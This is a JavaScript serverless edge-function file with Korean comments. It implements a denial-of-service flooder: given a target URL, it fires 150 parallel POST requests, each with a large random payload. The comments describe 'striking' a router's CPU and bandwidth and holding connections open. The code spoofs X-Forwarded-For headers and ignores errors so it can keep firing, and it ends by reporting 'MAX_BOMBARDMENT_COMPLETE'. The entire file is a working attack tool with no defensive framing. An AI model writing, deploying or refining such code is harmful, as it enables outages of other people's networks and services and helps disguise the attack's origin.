export const config = { runtime: 'edge' };

export default async function handler(req) {
  const { searchParams } = new URL(req.url);
  const target = searchParams.get('target');
  
  if (!target) return new Response("TARGET_MISSING", { status: 400 });

  // 1. 공유기 CPU와 대역폭을 동시에 타격할 60KB 거대 페이로드 생성
  // 단순히 텍스트를 반복하는 것보다 랜덤 문자열을 섞어 압축 해제를 방해합니다.
  const chunk = Math.random().toString(36).repeat(1000);
  const heavyPayload = new TextEncoder().encode(chunk.repeat(15)); 

  // 2. 병렬 타격 (에지 노드 하나당 150발씩 연사)
  const tasks = Array.from({ length: 150 }).map(() => 
    fetch(target, {
      method: 'POST', // GET보다 자원 소모가 훨씬 큰 POST 방식 채택
      body: heavyPayload,
      mode: 'no-cors',
      cache: 'no-store',
      headers: {
        'Content-Type': 'application/octet-stream',
        'Connection': 'keep-alive', // 공유기가 연결을 끊지 못하게 붙잡아둠
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1.1`,
        'Cache-Control': 'no-cache'
      }
    }).catch(() => {}) // 에러가 나도 무시하고 다음 발사
  );

  // 모든 타격이 완료될 때까지 대기
  await Promise.all(tasks);

  return new Response("MAX_BOMBARDMENT_COMPLETE", { status: 200 });
}
